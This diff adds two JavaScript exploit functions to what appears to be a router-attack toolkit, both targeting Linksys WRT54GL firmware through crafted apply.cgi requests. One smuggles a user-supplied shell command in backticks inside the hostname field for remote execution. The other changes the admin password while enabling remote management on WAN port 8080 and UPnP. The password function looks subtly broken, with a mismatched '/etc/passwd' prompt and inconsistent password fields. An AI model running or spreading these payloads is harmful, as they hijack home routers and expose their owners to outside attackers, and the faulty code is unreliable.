@@ -554,6 +554,22 @@ function dsl320b_configdisclosure(ip)
     document.location="http://"+ip+"/config.bin";
 }
 
+// Linksys WRT54GL v1.1 4.30.15 - Remote Command Execution
+function wrt54gl_remoteexec(ip)
+{
+	ip = ip || "192.168.1.1";
+	cmd = encodeURIComponent(prompt("Command: (ex: ping 192.168.1.100)")).replace(/\./g, "%2e");
+	document.location = "http://" + ip + "/apply.cgi?submit_button=index&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=test&wan_hostname=`" + cmd + "`&wan_domain=test&mtu_enable=1&wan_mtu=1500&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=178&lan_ipaddr_3=166&lan_netmask=255.255.255.0&lan_proto=dhcp&dhcp_check=&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1";
+}
+
+// Linksys WRT54GL v1.1 4.30.15 - Change admin password
+function wrt54gl_changepassword(ip)
+{
+	ip = ip || "192.168.1.1";
+	password = prompt("Path: (ex: /etc/passwd)");
+	document.location = "http://" + ip + "/apply.cgi?submit_button=Management&change_action=&action=Apply&PasswdModify=1&remote_mgt_https=0&http_enable=1&https_enable=0&wait_time=4&need_reboot=0&http_passwd=" + password + "1&http_passwdConfirm=" + password + "&_http_enable=1&web_wl_filter=0&remote_management=1&http_wanport=8080&upnp_enable=1&upnp_config=1&upnp_internet_dis=0";
+}
+
 // Cisco Linksys E4200 - Directory Traversal
 function e4200_dirtraversal(ip)
 {
